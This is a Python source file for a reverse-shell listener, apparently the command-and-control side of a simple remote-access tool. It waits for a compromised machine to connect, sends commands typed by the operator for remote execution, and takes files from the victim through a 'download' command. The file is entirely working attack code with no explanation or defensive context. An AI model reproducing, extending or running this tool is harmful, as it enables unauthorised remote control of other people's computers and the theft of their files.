import socket,json,subprocess,base64,time
class Listener:
    def __init__(self,ip,port):
        self.ip = ip
        self.port = port

    def write_file(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
            file.close()
        return "[+]DOWNLOADED " + path

    def exit(self,):
        print("[+] DISCONNECTING")
        print("[+] EXITING")
        time.sleep(10)
        subprocess.call("clear", shell=True)
        exit()

    def send(self,data,connection):
        commands = json.dumps(data)
        connection.send(commands)
        if data[0] == "exit":
            connection.close()
            self.exit()

    def receive(self,connection):
        data = ""
        while True:
            try:
                data += connection.recv(1024)
                output = json.loads(data)
                return output
            except ValueError:
                continue

    def current_directory(self,connection):
        self.send(["cd"], connection)
        cd = self.receive(connection)
        return cd

    def post_connection(self,connection):
        cd = self.current_directory(connection)
        cd = str(cd)
        while True:
            command = raw_input("COMMAND >> ").split(" ")
            self.send(command,connection)
            output = self.receive(connection)
            if command[0] == "download":
                output = self.write_file(command[1],output)
            print(output)

    def start(self):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((self.ip,self.port))
        listener.listen(0)
        print("[+] WAITING FOR A CONNECTION")
        self.connection, self.address = listener.accept()
        print("[+] CONNECTED TO " + str(self.address))
        try:
            self.post_connection(self.connection)
        except KeyboardInterrupt:
            self.send("exit",self.connection)
